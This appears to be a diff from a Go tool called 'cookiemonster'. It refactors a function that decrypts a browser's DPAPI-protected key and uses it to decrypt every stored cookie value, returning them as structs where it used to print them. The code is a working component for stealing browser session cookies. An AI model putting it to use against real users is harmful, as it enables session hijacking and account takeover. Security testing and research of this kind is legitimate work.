@@ -1,52 +1,55 @@
 package cookiemonster
 
 import (
-	"fmt"
 	"log"
 
 	"github.com/yanard18/cookiemonster/internal/decryption"
 )
 
-func PrintCookies(stateFile, cookiesFile string) (string, error) {
+func GetCookies(stateFile, cookiesFile string) ([]Cookie, error) {
 	encryptedKey, err := ParseLocalState(stateFile)
 	if err != nil {
 		log.Printf("[-] Error parsing local state file: %v\n", err)
-		return "", err
+		return nil, err
 	}
 
 	key, err := decryption.DecryptDPAPI(encryptedKey)
 	if err != nil {
 		log.Printf("[-] Error decrypting DPAPI blob of local state encrypted key: %v\n", err)
-		return "", err
+		return nil, err
 	}
 
 	cookies, err := ParseCookies(cookiesFile)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 
 	log.Printf("[+] Found %d cookies\n", len(cookies))
 
-	var output string
+	var out []Cookie
 	for _, cookie := range cookies {
 
 		// Decrypt the cookie value
-		decrypted, err := decryption.DecryptEncryptedCookieValue([]byte(cookie.Value), key)
+		decryptedCookieValue, err := decryption.DecryptEncryptedCookieValue([]byte(cookie.Value), key)
 		if err != nil {
 			log.Printf("[-] Error decrypting cookie value: %v\n", err)
 			continue
 		}
 
-		output += fmt.Sprintf("[+] Host: %s\n", cookie.Host)
-		output += fmt.Sprintf("    Name: %s\n", cookie.Name)
-		output += fmt.Sprintf("    Value: %s\n", decrypted)
-		output += fmt.Sprintf("    Path: %s\n", cookie.Path)
-		output += fmt.Sprintf("    IsSecure: %t\n", cookie.IsSecure)
-		output += fmt.Sprintf("    IsHttpOnly: %t\n", cookie.IsHttpOnly)
-		output += fmt.Sprintf("    CreationUtc: %d\n", cookie.CreationUtc)
-		output += fmt.Sprintf("    ExpiryUtc: %d\n", cookie.ExpiryUtc)
-		output += fmt.Sprintln("--------------------------------------------------")
+		// create cookie struct
+		decryptedCookie := Cookie{
+			Host:        cookie.Host,
+			Name:        cookie.Name,
+			Value:       decryptedCookieValue,
+			Path:        cookie.Path,
+			IsSecure:    cookie.IsSecure,
+			IsHttpOnly:  cookie.IsHttpOnly,
+			CreationUtc: cookie.CreationUtc,
+			ExpiryUtc:   cookie.ExpiryUtc,
+		}
+
+		out = append(out, decryptedCookie)
 	}
 
-	return output, nil
+	return out, nil
 }
